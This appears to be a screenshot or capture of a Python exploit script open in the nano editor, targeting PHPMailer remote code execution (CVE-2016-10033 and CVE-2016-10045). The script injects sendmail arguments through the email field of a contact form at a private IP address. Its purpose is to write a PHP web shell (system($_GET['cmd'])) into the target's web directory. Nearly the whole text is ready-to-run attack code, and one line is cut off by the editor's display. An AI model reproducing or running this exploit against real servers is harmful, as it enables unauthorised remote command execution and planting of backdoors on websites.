  GNU nano 5.9                             script_mailer.py                                      

import time
import urllib
import urllib2
import socket
import sys

RW_DIR = "/var/www/html/vendor"

url = 'http://172.30.0.125/contact.php' # Set destination URL here

# Choose/uncomment one of the payloads:

# PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
payload = '"attacker\\" -oQ/tmp/ -X%s/phpcode-teste2.php  dese"@email.com' % RW_DIR

# Bypass / PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
#payload = "\"attacker\\' -oQ/tmp/ -X%s/phpcode2.php  desec\"@email.com" % RW_DIR

######################################

# PHP code to be saved into the backdoor php file on the target in RW_DIR
RCE_PHP_CODE = "<?php system($_GET[\"cmd\"]); ?>"

post_fields = {'action': 'send', 'name': 'HACKER', 'email': payload,'subject':'Hack', 'message':>

# Attack
data = urllib.urlencode(post_fields)
req = urllib2.Request(url, data)
response = urllib2.urlopen(req)
the_page = response.read()

